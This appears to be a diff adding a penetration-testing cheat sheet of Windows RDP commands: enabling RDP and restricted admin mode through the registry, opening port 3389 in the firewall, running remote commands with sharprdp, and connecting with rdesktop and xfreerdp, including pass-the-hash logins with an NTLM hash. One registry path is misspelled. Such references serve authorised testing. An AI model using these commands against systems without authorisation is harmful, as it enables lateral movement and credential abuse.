@@ -1,0 +1,38 @@
+% rdp, windows, 3389
+
+# enable RDP
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+
+# enable restricted admin
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0 
+
+# disable restricted admin
+Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin 
+
+# rdp from console 
+sharprdp.exe computername=<computer> command="<command>" username=<domain>\<user> password=<password> 
+
+# Add firewall authorisation RDP
+netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes profile=private,domain localport=3389 protocol=tcp 
+
+% rdp, windows, rdesktop
+
+# classic 
+rdesktop -g 90% <ip> -u <user> -p <password> -d <domain> 
+
+# with share 
+rdesktop -g 90% <ip> -u <user> -p <password> -d <domain> -r disk:share=<share> 
+
+ % rdp, windows, xfreerdp
+
+# classic 
+xfreerdp /u:<user> /p:<password> /d:<domain> /v:<ip> /size:1800x924 
+
+# with share 
+xfreerdp /u:<user> /p:<password> /d:<domain> /v:<ip> /size:1800x924 /drive:share,<share> 
+
+# pass the hash 
+xfreerdp /u:<user> /pth:<hash> /d:<domain> /v:<ip> 
+
+# Connect using hash
+xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
